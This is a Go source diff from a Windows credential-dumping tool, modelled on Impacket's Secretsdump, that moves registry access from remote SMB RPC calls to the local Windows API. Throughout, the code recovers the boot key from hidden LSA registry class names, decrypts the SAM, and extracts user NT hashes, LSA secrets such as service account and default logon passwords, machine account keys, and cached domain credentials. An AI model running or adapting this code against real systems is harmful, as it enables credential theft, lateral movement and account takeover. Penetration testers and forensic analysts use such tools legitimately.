@@ -33,9 +33,8 @@ import (
 	"strconv"
 	"strings"
 
-	"github.com/jfjallid/go-smb/smb/dcerpc/msrrp"
-	"github.com/jfjallid/go-smb/smb/encoder"
 	"golang.org/x/crypto/md4"
+	"golang.org/x/sys/windows"
 )
 
 var (
@@ -245,17 +244,17 @@ func pad64(data uint64) uint64 {
 	return data
 }
 
-func getServiceUser(rpccon *msrrp.RPCCon, base []byte, name string) (result string, err error) {
-	hSubKey, err := rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Services\`+name)
+func getServiceUser(base windows.Handle, name string) (result string, err error) {
+	hSubKey, err := OpenSubKey(base, `SYSTEM\CurrentControlSet\Services\`+name)
 	if err != nil {
 		log.Errorln(err)
 		return
 	}
-	defer rpccon.CloseKeyHandle(hSubKey)
-	return rpccon.QueryValueString(hSubKey, "ObjectName")
+	defer CloseKeyHandle(hSubKey)
+	return QueryValueString(hSubKey, "ObjectName")
 }
 
-func parseSecret(rpccon *msrrp.RPCCon, base []byte, name string, secretItem []byte) (result *printableLSASecret, err error) {
+func parseSecret(base windows.Handle, name string, secretItem []byte) (result *printableLSASecret, err error) {
 
 	if len(secretItem) == 0 {
 		log.Debugf("Discarding secret %s, NULL Data\n", name)
@@ -271,14 +270,14 @@ func parseSecret(rpccon *msrrp.RPCCon, base []byte, name string, secretItem []by
 	result = &printableLSASecret{}
 	result.secretType = "[*] " + name
 	if strings.HasPrefix(upperName, "_SC_") {
-		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
+		secretDecoded, err2 := FromUnicodeString(secretItem)
 		if err2 != nil {
 			err = err2
 			log.Errorln(err)
 			return
 		}
 		//Get service account name
-		svcUser, err := getServiceUser(rpccon, base, name[4:]) // Skip initial _SC_ of the name
+		svcUser, err := getServiceUser(base, name[4:]) // Skip initial _SC_ of the name
 		if err != nil {
 			log.Errorln(err)
 			svcUser = "(unknown user)"
@@ -308,7 +307,7 @@ func parseSecret(rpccon *msrrp.RPCCon, base []byte, name string, secretItem []by
 		//    secret = fmt.Sprintf("%s: %s", username, secretDecoded)
 		//    result.secrets = append(result.secrets, secret)
 	} else if strings.HasPrefix(upperName, "ASPNET_WP_PASSWORD") {
-		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
+		secretDecoded, err2 := FromUnicodeString(secretItem)
 		if err2 != nil {
 			err = err2
 			log.Errorln(err)
@@ -332,7 +331,7 @@ func parseSecret(rpccon *msrrp.RPCCon, base []byte, name string, secretItem []by
 		secret = fmt.Sprintf("$MACHINE.ACC (NT Hash): %x", h.Sum(nil))
 		result.secrets = append(result.secrets, secret)
 		// Calculate AES128 and AES256 keys from plaintext passwords
-		hostname, domain, err := getHostnameAndDomain(rpccon, base)
+		hostname, domain, err := getHostnameAndDomain(base)
 		if err != nil {
 			log.Errorln(err)
 			// Skip calculation of AES Keys if request failed or if domain is empty
@@ -354,7 +353,7 @@ func parseSecret(rpccon *msrrp.RPCCon, base []byte, name string, secretItem []by
 	} else if strings.HasPrefix(upperName, "CACHEDDEFAULTPASSWORD") {
 		//TODO What is CachedDefaultPassword? How is it different from the registry keys under winlogon?
 		// Default password for winlogon
-		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
+		secretDecoded, err2 := FromUnicodeString(secretItem)
 		if err2 != nil {
 			err = err2
 			log.Errorln(err)
@@ -380,7 +379,7 @@ func parseSecret(rpccon *msrrp.RPCCon, base []byte, name string, secretItem []by
 	return
 }
 
-func getBootKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err error) {
+func getBootKey(base windows.Handle) (result []byte, err error) {
 	// check if bootkey is already retrieved
 	if len(BootKey) != 0 {
 		return BootKey, nil
@@ -391,18 +390,18 @@ func getBootKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err error) {
 	var p []byte = []byte{0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7}
 	scrambledKey := make([]byte, 0, 16)
 
-	hSubKey, err := rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\JD`)
+	hSubKey, err := OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\JD`)
 	if err != nil {
 		log.Errorln(err)
 		return
 	}
-	keyinfo, err := rpccon.QueryKeyInfo(hSubKey)
+	keyinfo, err := QueryKeyInfo(hSubKey)
 	if err != nil {
 		log.Errorln(err)
-		rpccon.CloseKeyHandle(hSubKey)
+		CloseKeyHandle(hSubKey)
 		return
 	}
-	rpccon.CloseKeyHandle(hSubKey)
+	CloseKeyHandle(hSubKey)
 	jd, err := hex.DecodeString(keyinfo.ClassName)
 	if err != nil {
 		log.Errorln(err)
@@ -412,18 +411,18 @@ func getBootKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err error) {
 	log.Debugf("KeyClass: %x\n", jd)
 	scrambledKey = append(scrambledKey, jd...)
 
-	hSubKey, err = rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\Skew1`)
+	hSubKey, err = OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\Skew1`)
 	if err != nil {
 		log.Errorln(err)
 		return
 	}
-	keyinfo, err = rpccon.QueryKeyInfo(hSubKey)
+	keyinfo, err = QueryKeyInfo(hSubKey)
 	if err != nil {
 		log.Errorln(err)
-		rpccon.CloseKeyHandle(hSubKey)
+		CloseKeyHandle(hSubKey)
 		return
 	}
-	rpccon.CloseKeyHandle(hSubKey)
+	CloseKeyHandle(hSubKey)
 	skew1, err := hex.DecodeString(keyinfo.ClassName)
 	if err != nil {
 		log.Errorln(err)
@@ -433,18 +432,18 @@ func getBootKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err error) {
 	log.Debugf("KeyClass: %x\n", skew1)
 	scrambledKey = append(scrambledKey, skew1...)
 
-	hSubKey, err = rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\GBG`)
+	hSubKey, err = OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\GBG`)
 	if err != nil {
 		log.Errorln(err)
 		return
 	}
-	keyinfo, err = rpccon.QueryKeyInfo(hSubKey)
+	keyinfo, err = QueryKeyInfo(hSubKey)
 	if err != nil {
 		log.Errorln(err)
-		rpccon.CloseKeyHandle(hSubKey)
+		CloseKeyHandle(hSubKey)
 		return
 	}
-	rpccon.CloseKeyHandle(hSubKey)
+	CloseKeyHandle(hSubKey)
 	gbg, err := hex.DecodeString(keyinfo.ClassName)
 	if err != nil {
 		log.Errorln(err)
@@ -454,18 +453,18 @@ func getBootKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err error) {
 	log.Debugf("KeyClass: %x\n", gbg)
 	scrambledKey = append(scrambledKey, gbg...)
 
-	hSubKey, err = rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\Data`)
+	hSubKey, err = OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\Data`)
 	if err != nil {
 		log.Errorln(err)
 		return
 	}
-	keyinfo, err = rpccon.QueryKeyInfo(hSubKey)
+	keyinfo, err = QueryKeyInfo(hSubKey)
 	if err != nil {
 		log.Errorln(err)
-		rpccon.CloseKeyHandle(hSubKey)
+		CloseKeyHandle(hSubKey)
 		return
 	}
-	rpccon.CloseKeyHandle(hSubKey)
+	CloseKeyHandle(hSubKey)
 	data, err := hex.DecodeString(keyinfo.ClassName)
 	if err != nil {
 		log.Errorln(err)
@@ -486,37 +485,33 @@ func getBootKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err error) {
 	return
 }
 
-func getSysKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (sysKey []byte, err error) {
+func getSysKey(base windows.Handle) (sysKey []byte, err error) {
 	var tmpSysKey []byte
-	_, err = getBootKey(rpccon, base)
+	_, err = getBootKey(base)
 	if err != nil {
 		return
 	}
-	var hSubKey []byte
-	if modifyDacl {
-		hSubKey, err = rpccon.OpenSubKey(base, `SAM\SAM\Domains\Account`)
-	} else {
-		hSubKey, err = rpccon.OpenSubKeyExt(base, `SAM\SAM\Domains\Account`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
-	}
+	var hSubKey windows.Handle
+		hSubKey, err = OpenSubKeyExt(base, `SAM\SAM\Domains\Account`, RegOptionBackupRestore, PermMaximumAllowed)
 	if err != nil {
 		log.Errorln(err)
 		return
 	}
 
-	fBytes, _, err := rpccon.QueryValue2(hSubKey, "F")
+	fBytes, _, err := QueryValue2(hSubKey, "F")
 	if err != nil {
 		log.Errorln(err)
-		rpccon.CloseKeyHandle(hSubKey)
+		CloseKeyHandle(hSubKey)
 		return
 	}
 
-	rpccon.CloseKeyHandle(hSubKey)
+	CloseKeyHandle(hSubKey)
 
 	f := &domain_account_f{}
 	err = f.unmarshal(fBytes)
 	if err != nil {
 		log.Errorln(err)
-		rpccon.CloseKeyHandle(hSubKey)
+		CloseKeyHandle(hSubKey)
 		return
 	}
 
@@ -530,7 +525,7 @@ func getSysKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (sysKey []byt
 		err = binary.Read(bytes.NewReader(f.Data), binary.LittleEndian, &samAesData)
 		if err != nil {
 			log.Errorln(err)
-			rpccon.CloseKeyHandle(hSubKey)
+			CloseKeyHandle(hSubKey)
 			return
 		}
 		sysKeyIV = samAesData.Salt[:]
@@ -543,7 +538,7 @@ func getSysKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (sysKey []byt
 		err = binary.Read(bytes.NewReader(f.Data), binary.LittleEndian, samData)
 		if err != nil {
 			log.Errorln(err)
-			rpccon.CloseKeyHandle(hSubKey)
+			CloseKeyHandle(hSubKey)
 			return
 		}
 
@@ -606,7 +601,7 @@ func DecryptAESSysKey(bootKey, encSysKey, sysKeyIV []byte) (sysKey []byte, err e
 	return
 }
 
-func getNTHash(rpccon *msrrp.RPCCon, base []byte, rids []string, modifyDacl bool) (result []UserCreds, err error) {
+func getNTHash(base windows.Handle, rids []string) (result []UserCreds, err error) {
 	result = make([]UserCreds, len(rids))
 	log.Debugf("Number users: %d\n", len(rids))
 	// Some entires have empty passwords or hash retrieval fails for some reason.
@@ -614,7 +609,7 @@ func getNTHash(rpccon *msrrp.RPCCon, base []byte, rids []string, modifyDacl bool
 	// instead of at the end of the loop to make sure it happens
 
 	// Determine OS version once
-	osBuild, osVersion, isServer, err := GetOSVersionBuild(rpccon, base)
+	osBuild, osVersion, isServer, err := GetOSVersionBuild(base)
 	if err != nil {
 		log.Errorln(err)
 		return
@@ -633,24 +628,20 @@ func getNTHash(rpccon *msrrp.RPCCon, base []byte, rids []string, modifyDacl bool
 		rid := binary.BigEndian.Uint32(ridBytes)
 		result[cntr].RID = rid
 
-		var hSubKey []byte
-		if modifyDacl {
-			hSubKey, err = rpccon.OpenSubKey(base, ridStr)
-		} else {
-			hSubKey, err = rpccon.OpenSubKeyExt(base, ridStr, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
-		}
+		var hSubKey windows.Handle
+			hSubKey, err = OpenSubKeyExt(base, ridStr, RegOptionBackupRestore, PermMaximumAllowed)
 		if err != nil {
 			log.Errorln(err)
 			return nil, err
 		}
 
-		v, _, err := rpccon.QueryValue2(hSubKey, "V")
+		v, _, err := QueryValue2(hSubKey, "V")
 		if err != nil {
 			log.Errorln(err)
-			rpccon.CloseKeyHandle(hSubKey)
+			CloseKeyHandle(hSubKey)
 			return nil, err
 		}
-		rpccon.CloseKeyHandle(hSubKey)
+		CloseKeyHandle(hSubKey)
 		/*
 		   Information about the structure of the V value of
 		   SAM\SAM\Domain\Users\<sid> is collected from multiple locations but most
@@ -716,7 +707,7 @@ func getNTHash(rpccon *msrrp.RPCCon, base []byte, rids []string, modifyDacl bool
 
 		offsetName := binary.LittleEndian.Uint32(v[0x0c:]) + 0xcc
 		szName := binary.LittleEndian.Uint32(v[0x10:])
-		result[cntr].Username, err = encoder.FromUnicodeString(v[offsetName : offsetName+szName])
+		result[cntr].Username, err = FromUnicodeString(v[offsetName : offsetName+szName])
 		if err != nil {
 			log.Errorln(err)
 			continue
@@ -788,8 +779,8 @@ func getNTHash(rpccon *msrrp.RPCCon, base []byte, rids []string, modifyDacl bool
 	return
 }
 
-func decryptLSAKey(rpccon *msrrp.RPCCon, base []byte, data []byte) (result []byte, err error) {
-	_, err = getBootKey(rpccon, base)
+func decryptLSAKey(base windows.Handle, data []byte) (result []byte, err error) {
+	_, err = getBootKey(base)
 	if err != nil {
 		log.Errorln(err)
 		return
@@ -833,7 +824,7 @@ func decryptLSAKey(rpccon *msrrp.RPCCon, base []byte, data []byte) (result []byt
 	return
 }
 
-func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result []byte, err error) {
+func getLSASecretKey(base windows.Handle) (result []byte, err error) {
 	if len(LSAKey) > 0 {
 		return
 	}
@@ -857,12 +848,8 @@ func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result
 	VistaStyle = true
 	var data []byte
 	log.Debugln("Decrypting LSA Key")
-	var hSubKey []byte
-	if modifyDacl {
-		hSubKey, err = rpccon.OpenSubKey(base, `Security\Policy\PolEKList`)
-	} else {
-		hSubKey, err = rpccon.OpenSubKeyExt(base, `Security\Policy\PolEKList`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
-	}
+	var hSubKey windows.Handle
+		hSubKey, err = OpenSubKeyExt(base, `Security\Policy\PolEKList`, RegOptionBackupRestore, PermMaximumAllowed)
 	if err != nil {
 		if err == fmt.Errorf("ERROR_FILE_NOT_FOUND") {
 			VistaStyle = false
@@ -871,20 +858,16 @@ func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result
 			return
 		}
 	}
-	data, _, err = rpccon.QueryValue2(hSubKey, "")
+	data, _, err = QueryValue2(hSubKey, "")
 	if err != nil {
 		log.Errorln(err)
-		rpccon.CloseKeyHandle(hSubKey)
+		CloseKeyHandle(hSubKey)
 		return
 	}
-	rpccon.CloseKeyHandle(hSubKey)
+	CloseKeyHandle(hSubKey)
 
 	if !VistaStyle {
-		if modifyDacl {
-			hSubKey, err = rpccon.OpenSubKey(base, `Security\Policy\PolSecretEncryptionKey`)
-		} else {
-			hSubKey, err = rpccon.OpenSubKeyExt(base, `Security\Policy\PolSecretEncryptionKey`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
-		}
+			hSubKey, err = OpenSubKeyExt(base, `Security\Policy\PolSecretEncryptionKey`, RegOptionBackupRestore, PermMaximumAllowed)
 		if err != nil {
 			if err == fmt.Errorf("ERROR_FILE_NOT_FOUND") {
 				log.Infoln("Could not find LSA Secret key")
@@ -893,13 +876,13 @@ func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result
 			}
 			return
 		}
-		data, _, err = rpccon.QueryValue2(hSubKey, "")
+		data, _, err = QueryValue2(hSubKey, "")
 		if err != nil {
 			log.Errorln(err)
-			rpccon.CloseKeyHandle(hSubKey)
+			CloseKeyHandle(hSubKey)
 			return
 		}
-		rpccon.CloseKeyHandle(hSubKey)
+		CloseKeyHandle(hSubKey)
 	}
 	if len(data) == 0 {
 		err = fmt.Errorf("Failed to get LSA key")
@@ -907,7 +890,7 @@ func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result
 		return
 	}
 
-	result, err = decryptLSAKey(rpccon, base, data)
+	result, err = decryptLSAKey(base, data)
 	if err != nil {
 		log.Errorln(err)
 		return
@@ -918,14 +901,10 @@ func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result
 }
 
 // Code inspired/partially stolen from Impacket's Secretsdump
-func GetLSASecrets(rpccon *msrrp.RPCCon, base []byte, history, modifyDacl bool) (secrets []printableLSASecret, err error) {
+func GetLSASecrets(base windows.Handle, history bool) (secrets []printableLSASecret, err error) {
 	secretsPath := `SECURITY\Policy\Secrets`
 	var keys []string
-	if modifyDacl {
-		keys, err = rpccon.GetSubKeyNames(base, secretsPath)
-	} else {
-		keys, err = rpccon.GetSubKeyNamesExt(base, secretsPath, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
-	}
+	keys, err = GetSubKeyNamesExt(base, secretsPath, RegOptionBackupRestore, PermMaximumAllowed)
 	if err != nil {
 		log.Errorln(err)
 		return nil, err
@@ -937,7 +916,7 @@ func GetLSASecrets(rpccon *msrrp.RPCCon, base []byte, history, modifyDacl bool) 
 
 	// GetLSASecretKey
 	log.Debugln("Getting LSASecretKey")
-	_, err = getLSASecretKey(rpccon, base, modifyDacl)
+	_, err = getLSASecretKey(base)
 	if err != nil {
 		log.Errorln(err)
 		return
@@ -960,24 +939,20 @@ func GetLSASecrets(rpccon *msrrp.RPCCon, base []byte, history, modifyDacl bool) 
 		var secret []byte
 		for _, valueType := range valueTypeList {
 			log.Debugf("Retrieving value: %s\\%s\\%s\n", secretsPath, key, valueType)
-			var hSubKey []byte
-			if modifyDacl {
-				hSubKey, err = rpccon.OpenSubKey(base, fmt.Sprintf("%s\\%s\\%s", secretsPath, key, valueType))
-			} else {
-				hSubKey, err = rpccon.OpenSubKeyExt(base, fmt.Sprintf("%s\\%s\\%s", secretsPath, key, valueType), msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
-			}
+			var hSubKey windows.Handle
+			hSubKey, err = OpenSubKeyExt(base, fmt.Sprintf("%s\\%s\\%s", secretsPath, key, valueType), RegOptionBackupRestore, PermMaximumAllowed)
 			if err != nil {
 				log.Errorln(err)
 				return nil, err
 			}
 
-			value, _, err := rpccon.QueryValue2(hSubKey, "")
+			value, _, err := QueryValue2(hSubKey, "")
 			if err != nil {
 				log.Errorln(err)
-				rpccon.CloseKeyHandle(hSubKey)
+				CloseKeyHandle(hSubKey)
 				continue
 			}
-			rpccon.CloseKeyHandle(hSubKey)
+			CloseKeyHandle(hSubKey)
 
 			if (len(value) != 0) && (value[0] == 0x0) {
 				if VistaStyle {
@@ -1000,7 +975,7 @@ func GetLSASecrets(rpccon *msrrp.RPCCon, base []byte, history, modifyDacl bool) 
 				if valueType == "OldVal" {
 					key += "_history"
 				}
-				ps, err := parseSecret(rpccon, base, key, secret)
+				ps, err := parseSecret(base, key, secret)
 				if err != nil {
 					log.Errorln(err)
 					continue
@@ -1014,29 +989,25 @@ func GetLSASecrets(rpccon *msrrp.RPCCon, base []byte, history, modifyDacl bool) 
 	return
 }
 
-func getNLKMSecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result []byte, err error) {
+func getNLKMSecretKey(base windows.Handle) (result []byte, err error) {
 	if len(NLKMKey) > 0 {
 		return
 	}
 
 	log.Debugln("Decrypting NL$KM")
-	var hSubKey []byte
-	if modifyDacl {
-		hSubKey, err = rpccon.OpenSubKey(base, `SECURITY\Policy\Secrets\NL$KM\CurrVal`)
-	} else {
-		hSubKey, err = rpccon.OpenSubKeyExt(base, `SECURITY\Policy\Secrets\NL$KM\CurrVal`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
-	}
+	var hSubKey windows.Handle
+		hSubKey, err = OpenSubKeyExt(base, `SECURITY\Policy\Secrets\NL$KM\CurrVal`, RegOptionBackupRestore, PermMaximumAllowed)
 	if err != nil {
 		log.Errorln(err)
 		return
 	}
-	data, _, err := rpccon.QueryValue2(hSubKey, "")
+	data, _, err := QueryValue2(hSubKey, "")
 	if err != nil {
 		log.Errorln(err)
-		rpccon.CloseKeyHandle(hSubKey)
+		CloseKeyHandle(hSubKey)
 		return
 	}
-	rpccon.CloseKeyHandle(hSubKey)
+	CloseKeyHandle(hSubKey)
 
 	if VistaStyle {
 		lsaSecret := &lsa_secret{}
@@ -1060,22 +1031,18 @@ func getNLKMSecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (resul
 	return
 }
 
-func GetCachedHashes(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result []string, err error) {
+func GetCachedHashes(base windows.Handle) (result []string, err error) {
 	baseKeyPath := `Security\Cache`
 	var names []string
-	var hSubKey []byte
-	if modifyDacl {
-		hSubKey, err = rpccon.OpenSubKey(base, baseKeyPath)
-	} else {
-		hSubKey, err = rpccon.OpenSubKeyExt(base, baseKeyPath, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
-	}
+	var hSubKey windows.Handle
+		hSubKey, err = OpenSubKeyExt(base, baseKeyPath, RegOptionBackupRestore, PermMaximumAllowed)
 	if err != nil {
 		log.Errorln(err)
 		return
 	}
-	defer rpccon.CloseKeyHandle(hSubKey)
+	defer CloseKeyHandle(hSubKey)
 
-	valueNames, err := rpccon.GetValueNames(hSubKey)
+	valueNames, err := GetValueNames(hSubKey)
 	if err != nil {
 		log.Errorln(err)
 		return
@@ -1099,7 +1066,7 @@ func GetCachedHashes(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result
 	iterationCount := 10240
 	if foundIterCount {
 		var tmpIterCount uint32
-		data, _, err := rpccon.QueryValue2(hSubKey, `NL$IterationCount`)
+		data, _, err := QueryValue2(hSubKey, `NL$IterationCount`)
 		if err != nil {
 			log.Errorln(err)
 			return nil, err
@@ -1112,19 +1079,19 @@ func GetCachedHashes(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result
 		}
 	}
 
-	_, err = getLSASecretKey(rpccon, base, modifyDacl)
+	_, err = getLSASecretKey(base)
 	if err != nil {
 		log.Errorln(err)
 		return
 	}
-	_, err = getNLKMSecretKey(rpccon, base, modifyDacl)
+	_, err = getNLKMSecretKey(base)
 	if err != nil {
 		log.Errorln(err)
 		return
 	}
 	for _, name := range names {
 		log.Debugf("Looking into %s\n", name)
-		data, _, err := rpccon.QueryValue2(hSubKey, name)
+		data, _, err := QueryValue2(hSubKey, name)
 		if err != nil {
 			log.Errorln(err)
 			return nil, err
@@ -1159,13 +1126,13 @@ func GetCachedHashes(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result
 			}
 			encHash := plaintext[:0x10]
 			plaintext = plaintext[0x48:]
-			userName, err := encoder.FromUnicodeString(plaintext[:nl_record.UserLength])
+			userName, err := FromUnicodeString(plaintext[:nl_record.UserLength])
 			if err != nil {
 				log.Errorln(err)
 				continue
 			}
 			plaintext = plaintext[int(pad64(uint64(nl_record.UserLength)))+int(pad64(uint64(nl_record.DomainNameLength))):]
-			domainLong, err := encoder.FromUnicodeString(plaintext[:int(pad64(uint64(nl_record.DnsDomainNameLength)))])
+			domainLong, err := FromUnicodeString(plaintext[:int(pad64(uint64(nl_record.DnsDomainNameLength)))])
 			if err != nil {
 				log.Errorln(err)
 				continue
@@ -1185,17 +1152,17 @@ func GetCachedHashes(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result
 	return
 }
 
-func GetOSVersionBuild(rpccon *msrrp.RPCCon, base []byte) (build int, version float64, server bool, err error) {
-	hSubKey, err := rpccon.OpenSubKey(base, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`)
+func GetOSVersionBuild(base windows.Handle) (build int, version float64, server bool, err error) {
+	hSubKey, err := OpenSubKey(base, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`)
 	if err != nil {
 		log.Noticef("Failed to open registry key CurrentVersion with error: %v\n", err)
 		return
 	}
-	defer func(h []byte) {
-		rpccon.CloseKeyHandle(h)
+	defer func(h windows.Handle) {
+		CloseKeyHandle(h)
 	}(hSubKey)
 
-	value, err := rpccon.QueryValueString(hSubKey, "CurrentBuild")
+	value, err := QueryValueString(hSubKey, "CurrentBuild")
 	if err != nil {
 		log.Errorln(err)
 		return
@@ -1207,7 +1174,7 @@ func GetOSVersionBuild(rpccon *msrrp.RPCCon, base []byte) (build int, version fl
 		return
 	}
 
-	value, err = rpccon.QueryValueString(hSubKey, "CurrentVersion")
+	value, err = QueryValueString(hSubKey, "CurrentVersion")
 	if err != nil {
 		log.Errorln(err)
 		return
@@ -1219,16 +1186,16 @@ func GetOSVersionBuild(rpccon *msrrp.RPCCon, base []byte) (build int, version fl
 		return
 	}
 
-	hSubKey, err = rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\ProductOptions`)
+	hSubKey, err = OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\ProductOptions`)
 	if err != nil {
 		log.Noticef("Failed to open registry key ProductOptions with error: %v\n", err)
 		return
 	}
-	defer func(h []byte) {
-		rpccon.CloseKeyHandle(h)
+	defer func(h windows.Handle) {
+		CloseKeyHandle(h)
 	}(hSubKey)
 
-	value, err = rpccon.QueryValueString(hSubKey, "ProductType")
+	value, err = QueryValueString(hSubKey, "ProductType")
 	if err != nil {
 		log.Errorln(err)
 		return
@@ -1241,23 +1208,23 @@ func GetOSVersionBuild(rpccon *msrrp.RPCCon, base []byte) (build int, version fl
 	return
 }
 
-func getHostnameAndDomain(rpccon *msrrp.RPCCon, base []byte) (hostname, domain string, err error) {
-	hSubKey, err := rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Services\Tcpip\Parameters`)
+func getHostnameAndDomain(base windows.Handle) (hostname, domain string, err error) {
+	hSubKey, err := OpenSubKey(base, `SYSTEM\CurrentControlSet\Services\Tcpip\Parameters`)
 	if err != nil {
 		log.Noticef("Failed to open registry key Parameters with error: %v\n", err)
 		return
 	}
-	defer func(h []byte) {
-		rpccon.CloseKeyHandle(h)
+	defer func(h windows.Handle) {
+		CloseKeyHandle(h)
 	}(hSubKey)
 
-	domain, err = rpccon.QueryValueString(hSubKey, "Domain")
+	domain, err = QueryValueString(hSubKey, "Domain")
 	if err != nil {
 		log.Errorln(err)
 		return
 	}
 
-	hostname, err = rpccon.QueryValueString(hSubKey, "Hostname")
+	hostname, err = QueryValueString(hSubKey, "Hostname")
 	if err != nil {
 		log.Errorln(err)
 		return
